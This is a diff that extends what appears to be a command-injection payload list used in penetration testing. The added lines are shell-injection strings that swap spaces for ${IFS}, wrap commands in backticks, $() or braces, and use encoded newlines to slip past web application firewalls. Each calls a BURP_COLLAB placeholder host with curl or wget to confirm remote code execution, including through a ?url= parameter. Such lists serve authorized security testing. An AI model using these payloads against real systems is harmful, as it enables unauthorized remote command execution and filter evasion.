@@ -494,3 +494,22 @@ whoami
 || system('sleep 5');
 ||/usr/bin/id;
 ||/usr/bin/id|
+# IFS-hiding (avoids literal space — WAF-friendly)
+curl${IFS}BURP_COLLAB
+wget${IFS}BURP_COLLAB
+curl${IFS}-X${IFS}POST${IFS}BURP_COLLAB
+;curl${IFS}BURP_COLLAB;#
+`curl${IFS}BURP_COLLAB`
+$(curl${IFS}BURP_COLLAB)
+|curl${IFS}BURP_COLLAB
+&&curl${IFS}BURP_COLLAB&&
+%0acurl${IFS}BURP_COLLAB
+;curl${IFS}${PATH:0:1}BURP_COLLAB;#
+# ?url= parameter reaching a shell — test RCE before SSRF
+?url=http://x";curl${IFS}BURP_COLLAB;#
+?url=`curl${IFS}BURP_COLLAB`
+?url=%24(curl${IFS}BURP_COLLAB)
+# subshell brace expansion
+{curl,BURP_COLLAB}
+# bash brace-hidden URL
+curl${IFS}"$(echo BURP_COLLAB)"
